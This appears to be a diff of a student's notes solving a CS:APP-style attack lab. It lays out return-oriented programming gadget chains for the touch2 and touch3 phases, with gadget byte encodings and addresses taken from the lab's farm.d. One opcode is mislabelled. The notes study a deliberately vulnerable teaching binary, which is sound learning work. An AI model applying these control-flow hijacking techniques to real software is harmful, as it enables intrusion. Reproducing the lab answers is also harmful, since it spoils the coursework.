@@ -73,30 +73,57 @@ ret
 Stack:
 
 ```
-ADDR3       --> touch2()
-ADDR2       --> movl %eax,%edi
+touch2()
+movl %eax,%edi
 0x59b997fa
-ADDR1       --> popq %rax
+popq %rax
 ```
 
 ## Phase 5
+
+```
+$STRING
+touch3()
+mov %eax,%edi
+lea(%rdi,%rsi,1),%rax
+movl %ecx,%esi
+movl %edx,%ecx
+movl %eax,%edx
+$OFFSET
+popq %rax
+movq %rax,%rdi
+movq %rsp,%rax
+```
 
 ## Reference
 
 In `farm.d`, there are
 
 ```
-89 c7 90    # movl %eax,%edi -> 0x4019c6
-89 c2 90    # movl %eax,%edx
-89 ce 90    # movl %ecx,%esi
-89 e0 90    # movl %exp,%eax
+48 8d 04 37	# lea (%rdi,%rsi,1),%rax -> 0x4019d6
 
-48 89 c7 90 # movq %rax,%rdi
-48 89 e0 90 # movq %rsp,%rax
+89 c7       # movl %eax,%edi         -> 0x4019c6
+89 c2       # movl %eax,%edx         -> 0x4019dd
+89 ce       # movl %ecx,%esi         -> 0x401a13
+89 e0       # movl %esp,%eax
+89 d1       # movl %edx,%ecx         -> 0x401a69
 
-58 90       # popq %rax      -> 0x4019ab
+48 89 c7    # movq %rax,%rdi         -> 0x4019a2
+48 89 e0    # movq %rsp,%rax         -> 0x401aad
+
+58 90       # popq %rax              -> 0x4019ab
 
 20 c0       # andb %al,%al
+20 d2       # andb %dl,%dl
+20 db       # andb %bl,%bl
+
 84 c0       # testb %al,%al
+
 38 c0       # cmpb %al,%al
+38 c9       # cmpb %cl,%cl
+38 d2       # cmpb %dl,%dl
+
+08 c9       # orq %cl,%cl
+08 db       # orq %bl,%bl
+08 d2       # orq %dl,%dl
 ```
